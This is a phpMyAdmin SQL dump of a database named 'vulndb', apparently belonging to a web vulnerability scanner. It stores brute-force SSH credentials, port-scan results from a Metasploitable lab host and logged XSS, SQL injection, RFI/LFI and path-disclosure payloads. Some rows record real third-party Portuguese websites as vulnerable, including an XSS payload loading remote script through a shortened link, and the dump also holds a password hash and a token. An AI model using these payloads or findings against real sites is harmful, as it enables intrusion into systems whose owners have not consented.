-- phpMyAdmin SQL Dump
-- version 4.1.12
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 04-Fev-2015 às 23:43
-- Versão do servidor: 5.6.16
-- PHP Version: 5.5.11

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `vulndb`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `bruteforce`
--

CREATE TABLE IF NOT EXISTS `bruteforce` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `target` varchar(30) NOT NULL,
  `porta` int(6) NOT NULL,
  `protocolo` varchar(7) NOT NULL,
  `user` varchar(20) NOT NULL,
  `pass` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Extraindo dados da tabela `bruteforce`
--

INSERT INTO `bruteforce` (`id`, `target`, `porta`, `protocolo`, `user`, `pass`) VALUES
(1, 'localhost', 22, 'ssh', 'admin', '12345');

-- --------------------------------------------------------

--
-- Estrutura da tabela `fpd`
--

CREATE TABLE IF NOT EXISTS `fpd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `payload` varchar(255) NOT NULL,
  `vuln` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=12 ;

--
-- Extraindo dados da tabela `fpd`
--

INSERT INTO `fpd` (`id`, `url`, `payload`, `vuln`) VALUES
(1, 'http://workstation/sandbox/xss.php?nome=', 'Array nulo', 1),
(8, 'http://www.sinapsa.pt/noticias.php?cat=1', 'Array nulo', 0),
(9, 'http://www.sinapsa.pt/noticias.php?cat=1', 'Sess&atilde;o nula', 1),
(10, 'http://www.sinapsa.pt/noticias.php?cat=1', 'Sess&atilde;o inv&aacute;lida', 1),
(11, 'http://www.sinapsa.pt/noticias.php?cat=1', 'Sess&atilde;o inv&aacute;lida (129 bytes)', 1);

-- --------------------------------------------------------

--
-- Estrutura da tabela `inc_fich`
--

CREATE TABLE IF NOT EXISTS `inc_fich` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `tipo` varchar(6) NOT NULL,
  `payload` varchar(255) NOT NULL,
  `vuln` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Extraindo dados da tabela `inc_fich`
--

INSERT INTO `inc_fich` (`id`, `url`, `tipo`, `payload`, `vuln`) VALUES
(1, 'http://workstation/sandbox/rfi.php?f=', 'RFI', 'phpinfo();', 1),
(2, 'http://workstation/sandbox/rfi.php?f=', 'LFI', 'C:\\windows\\win.ini', 1),
(3, 'http://workstation/sandbox/rfi.php?f=', 'LFI', 'php://input', 0),
(7, 'http://workstation/sandbox/rfi.php?f=', 'LFI', 'data://text/plain;base64,SSBsb3ZlIFBIUAo=', 1);

-- --------------------------------------------------------

--
-- Estrutura da tabela `login`
--

CREATE TABLE IF NOT EXISTS `login` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user` varchar(20) NOT NULL,
  `pass` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Extraindo dados da tabela `login`
--

INSERT INTO `login` (`id`, `user`, `pass`) VALUES
(1, 'varelas', '0d1a7ac687ecdc9cff26e614721c6d9d');

-- --------------------------------------------------------

--
-- Estrutura da tabela `scans`
--

CREATE TABLE IF NOT EXISTS `scans` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `host` varchar(30) NOT NULL,
  `porta` int(5) NOT NULL,
  `servico` varchar(25) NOT NULL,
  `software` varchar(25) NOT NULL,
  `vuln` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=26 ;

--
-- Extraindo dados da tabela `scans`
--

INSERT INTO `scans` (`id`, `host`, `porta`, `servico`, `software`, `vuln`) VALUES
(2, '192.168.1.71', 80, 'http', 'Apache httpd 2.2.22', 0),
(3, '192.168.56.102', 21, 'ftp', 'vsftpd 2.3.4', 1),
(4, '192.168.56.102', 22, 'ssh', 'OpenSSH 4.7p1 Debian 8ubu', 1),
(5, '192.168.56.102', 23, 'telnet', 'Linux telnetd ', 0),
(6, '192.168.56.102', 25, 'smtp', 'Postfix smtpd ', 0),
(7, '192.168.56.102', 53, 'domain', 'ISC BIND 9.4.2', 0),
(8, '192.168.56.102', 80, 'http', 'Apache httpd 2.2.8', 0),
(9, '192.168.56.102', 111, 'rpcbind', ' 2', 0),
(10, '192.168.56.102', 139, 'netbios-ssn', 'Samba smbd 3.X', 0),
(11, '192.168.56.102', 445, 'netbios-ssn', 'Samba smbd 3.X', 0),
(12, '192.168.56.102', 513, 'login', ' ', 0),
(13, '192.168.56.102', 512, 'exec', 'netkit-rsh rexecd ', 0),
(14, '192.168.56.102', 514, 'shell', ' ', 0),
(15, '192.168.56.102', 2049, 'nfs', ' 2-4', 0),
(16, '192.168.56.102', 1099, 'java-rmi', 'Java RMI Registry ', 0),
(17, '192.168.56.102', 1524, 'shell', 'Metasploitable root shell', 0),
(18, '192.168.56.102', 2121, 'ftp', 'ProFTPD 1.3.1', 0),
(19, '192.168.56.102', 3306, 'mysql', 'MySQL 5.0.51a-3ubuntu5', 0),
(21, '192.168.56.102', 5432, 'postgresql', 'PostgreSQL DB 8.3.0 - 8.3', 0),
(22, '192.168.56.102', 6667, 'irc', 'Unreal ircd ', 0),
(23, '192.168.56.102', 8009, 'ajp13', 'Apache Jserv ', 0),
(24, '192.168.56.102', 5900, 'vnc', 'VNC ', 0),
(25, '192.168.56.102', 8180, 'http', 'Apache Tomcat/Coyote JSP ', 0);

-- --------------------------------------------------------

--
-- Estrutura da tabela `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `id` int(11) NOT NULL,
  `token` varchar(32) NOT NULL,
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `settings`
--

INSERT INTO `settings` (`id`, `token`) VALUES
(1, 'e3796ae838835da0b6f6ea37bcf8bcb7');

-- --------------------------------------------------------

--
-- Estrutura da tabela `sqli`
--

CREATE TABLE IF NOT EXISTS `sqli` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `metodo` varchar(4) NOT NULL,
  `postdata` varchar(255) NOT NULL,
  `vuln` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=9 ;

--
-- Extraindo dados da tabela `sqli`
--

INSERT INTO `sqli` (`id`, `url`, `metodo`, `postdata`, `vuln`) VALUES
(2, 'http://workstation/sandbox/sqli.php?id=', 'GET', '', 1),
(8, 'http://workstation/sandbox/sqli.php?id=1', 'GET', '', 1);

-- --------------------------------------------------------

--
-- Estrutura da tabela `xss`
--

CREATE TABLE IF NOT EXISTS `xss` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `payload` varchar(255) NOT NULL,
  `vuln` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=19 ;

--
-- Extraindo dados da tabela `xss`
--

INSERT INTO `xss` (`id`, `url`, `payload`, `vuln`) VALUES
(8, 'http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=', '&lt;marquee&gt;&lt;h1&gt;HTML_INJECTION', 1),
(13, 'http://workstation/sandbox/xss.php?nome=', '&quot;''/&gt;&lt;script src=&quot;http://goo.gl/Jbqdvv&quot;&gt;&lt;/script&gt;', 1),
(17, 'http://workstation/sandbox/xss.php?qwert=', '&quot;''/&gt;&lt;script src=&quot;http://goo.gl/Jbqdvv&quot;&gt;&lt;/script&gt;', 0),
(18, 'http://www.epinfante.pt/recursoshumanos/index.php?ano=', '&quot;''/&gt;&lt;script src=&quot;http://goo.gl/Jbqdvv&quot;&gt;&lt;/script&gt;', 1);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
